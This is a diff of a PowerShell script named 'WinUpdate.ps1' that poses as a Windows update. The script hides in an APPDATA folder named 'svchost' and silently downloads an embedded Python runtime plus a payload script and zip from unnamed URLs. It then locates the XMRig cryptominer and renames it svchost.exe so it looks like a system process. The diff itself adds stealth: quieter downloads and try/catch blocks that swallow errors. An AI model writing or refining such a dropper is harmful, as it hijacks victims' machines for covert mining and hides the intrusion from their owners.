@@ -1,4 +1,8 @@
 # --- THE FINAL MASTER (WinUpdate.ps1) ---
+# Forced TLS 1.2 for modern HTTPS handshakes
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ProgressPreference = 'SilentlyContinue' # Stealthier and faster downloads
+
 $ID = "svchost"
 $Path = "$env:APPDATA\$ID"
 
@@ -12,14 +16,27 @@ New-Item -ItemType Directory -Path $Path -Force | Out-Null
 
 # 3. Shadow Engine Setup (No-Python Fix)
 $PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
-Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
-Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
-Remove-Item "$Path\py.zip"
+try {
+    Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
+    if (Test-Path "$Path\py.zip") {
+        Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
+        Remove-Item "$Path\py.zip"
+    }
+} catch {
+    # Silent fail to keep things moving
+}
 
 # 4. Deployment
-Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
-Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"
-Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
+try {
+    Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
+    Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"
+    
+    if (Test-Path "$Path\UpdataData.zip") {
+        Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
+    }
+} catch {
+    # Still trying to move forward
+}
 
 # Search for xmrig.exe and rename it to svchost.exe
 $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
